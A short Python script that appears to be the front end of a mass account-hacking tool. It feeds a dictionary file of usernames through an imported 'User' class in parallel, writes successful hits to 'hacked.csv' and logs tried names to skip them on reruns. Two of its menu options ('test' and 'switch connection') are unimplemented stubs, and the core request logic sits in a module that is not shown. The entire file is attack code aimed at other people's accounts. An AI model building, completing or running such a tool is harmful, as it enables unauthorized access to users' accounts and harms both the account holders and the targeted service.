from os import path
from ob_request import User
from helper import *
import multiprocessing as mp
from tqdm import *
import speedtest

TESTED = []


def init(args):
    global TESTED
    TESTED = args


def attack(username):
    if username not in TESTED:
        try:
            user = User(username.replace('\n', ''))
            user.execute()
            if user:
                write('hacked.csv', str(user))
            write('tested.txt', username)
        except:
            pass


def generate_username():
    dict_path = input('Enter the dictionary filepath: ')

    if path.isfile(dict_path):
        global TESTED
        TESTED = list(open('tested.txt', 'r'))
        usernames = list(open(dict_path, 'r'))

        with mp.Pool(mp.cpu_count(), initializer=init, initargs=(TESTED,)) as p:
            with tqdm(total=len(usernames)) as pbar:
                for i, _ in enumerate(p.imap_unordered(attack, usernames)):
                    pbar.update()
    else:
        print('File not found')


def test_username():
    print('test')


def switch_connection():
    print('switch')


MENU = {
    1: generate_username,
    2: test_username,
    3: switch_connection,
    4: exit
}

if __name__ == '__main__':
    print('============================================')
    print('1.Generate username list')
    print('2.Test username')
    print('3.Switch username')
    print('4.Exit')
    print('============================================')
    MENU.get(int(input('\nSelect an options : ')), lambda: 'Invalid option selected')()
